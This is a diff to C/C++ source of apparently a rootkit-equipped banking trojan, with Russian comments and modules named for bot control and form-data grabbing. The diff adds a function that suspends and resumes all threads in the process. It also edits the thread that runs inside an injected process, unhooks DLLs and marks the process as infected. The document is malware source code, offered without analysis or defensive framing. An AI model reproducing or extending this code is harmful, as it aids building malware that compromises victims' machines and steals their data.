@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <tlhelp32.h>
 
 #include "GetApi.h"
 #include "DllLoader.h"
@@ -13,7 +14,6 @@
 #include "Trade.h"
 #include "ntdll.h"
 #include "BotEvents.h"
-//#include "CmdLine.h"
 #include "BotCore.h"
 #include "PostDataGrabber.h"
 
@@ -498,9 +498,59 @@ void RootkitDoStartApplication(TEventData *Data, DWORD AppHash)
 
 
 
+//------------------------------------------------------
+//  StartStopProcessThreads
+//
+//  Функция останавливает/запускает все потоки процесса
+//  кроме того из ко торого произошёл вызов функции
+//------------------------------------------------------
+bool StartStopProcessThreads(bool Stop)
+{
+	// Получам симок работающих процессов
+	DWORD PID    = Bot->PID();
+	DWORD Thread = (DWORD)pGetCurrentThreadId();
+
+	HANDLE Snap = (HANDLE)pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
+	if(Snap == INVALID_HANDLE_VALUE) return false;
+
+	THREADENTRY32 te;
+	te.dwSize = sizeof(THREADENTRY32 );
+
+	if (pThread32First(Snap, &te))
+    {
+		do
+		{
+			if(te.th32ThreadID != Thread && te.th32OwnerProcessID == PID)
+			{
+				HANDLE Handle = (HANDLE)pOpenThread(THREAD_SUSPEND_RESUME, false, te.th32ThreadID);
+				if (Handle)
+				{
+					if (Stop)
+						pSuspendThread(Handle);
+					else
+						pResumeThread(Handle);
+					pCloseHandle(Handle);
+                }
+			}
+		}
+		while(pThread32Next(Snap, &te));
+	}
+	pCloseHandle(Snap);
+	return true;
+}
+
+
+
+
 DWORD WINAPI RootkitThread(LPVOID)
 {
 	BOT::Initialize(ProcessUnknown);
+
+	// Помечаем процесс как инфицированный
+    BOT::MarkAsInfcted();
+
+	// Приостанавливаем всепотоки
+   //	StartStopProcessThreads(true);
 
     // Поток работает в заинжекченном процессе
 	UnhookDlls();
@@ -518,13 +568,14 @@ DWORD WINAPI RootkitThread(LPVOID)
 
 	Data.Application = AppName.t_str();
 	DWORD hashApp = File::GetNameHashA((PCHAR)AppName.t_str(), true);
-//	DWORD PID = GetUniquePID();
-//	RTKDBG("rotkit", "Запущен процесс %s, вызван процессом PID=%d", AppName.t_str(), GetParentPID() );
 	RTKDBG("rotkit", "Запущен процесс %s", AppName.t_str() );
 
 	RootkitDoStartApplication(&Data, hashApp); 
 
 	ApplicationStarted(&Data);
+
+	// Стартуем потоки
+	//StartStopProcessThreads(false);
 
 	return 0;
 }
